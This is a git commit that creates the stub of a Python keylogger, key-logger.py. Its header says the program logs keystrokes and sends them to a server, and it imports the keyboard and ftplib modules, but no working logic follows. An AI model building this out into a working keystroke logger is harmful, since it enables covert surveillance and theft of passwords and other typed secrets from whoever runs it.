3db1537e6cdcc99c6d22501b742be0fc39795244
IvoryCoding <67837670+IvoryCoding@users.noreply.github.com>
2022-04-13 17:42:07 -0600

    starting from scratch
    starting from scratch

---
+++ key-logger.py
@@ -0,0 +1,14 @@
+#   Date:        2022/04/13
+#   Author:      Emma Gillespie
+#   Description: Creates a log of keys and sends them to the server
+#   Resources:   
+
+#!/usr/bin/python3
+
+from threading import Timer
+from datetime import datetime
+
+import keyboard
+import ftplib
+
+
